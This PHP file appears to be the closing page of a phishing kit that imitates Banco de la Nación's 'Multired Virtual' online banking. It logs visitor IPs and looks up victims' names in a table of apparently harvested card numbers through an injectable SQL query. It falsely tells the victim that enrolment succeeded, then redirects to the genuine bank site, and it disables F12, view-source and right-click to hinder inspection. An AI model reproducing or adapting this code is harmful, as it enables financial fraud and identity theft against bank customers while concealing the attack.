﻿<?php
error_reporting(0);
session_start();
/*===================================================*/
$card = ($_SESSION["card"] ? $_SESSION["card"] : base64_decode($_GET["card"]));
$user = $_GET["cgi"];
/*===================================================*/
$ipv = $_SERVER["REMOTE_ADDR"];

$ban = fopen("IPBam.txt","a+");
fwrite($ban,$ipv."\r\n");
fclose($ban);
/*===================================================*/
include("class/db.php"); 
$result = $link->query("SELECT * FROM usuarios WHERE card='".$card."'");
$row = $result->fetch_array(MYSQLI_NUM);
$nombre = $row[3];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta charset="utf-8">
<title>Banco de la Nación - Multired Virtual</title>
<link rel="stylesheet" type="text/css" href="files/css/resetearcss.css">
<link rel="stylesheet" type="text/css" href="files/css/tipografias.css">
<link rel="stylesheet" type="text/css" href="files/css/bn-estilos.css">  
<script language="javascript">
function continuar(){
	window.open("https://zonasegura1.bn.com.pe/BNWeb/Inicio", "_parent"); }
</script>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false); </script></head><body>
<div id="contenidos-informativos"><div class="fila limpiar"></div><div class="fila limpiar"></div><div class="fila limpiar"></div>
		<div class="fila limpiar"></div>
		<div class="fila limpiar"></div>
		<div class="fila limpiar"></div>
		<div class="fila limpiar">
		<label for="cliente" class="cerrar">Estimado(a) <?=strtoupper($nombre);?>,</label>
		</div>
		<br>
		<div class="fila limpiar">
		<label for="cliente" class="cerrar">El proceso de afiliación se realizado con éxito.</label>
		</div>
		<div class="boton">
		<input type="button" value="ACEPTAR" onclick="javascript:continuar();">
		</div>  
	</div>
</body></html>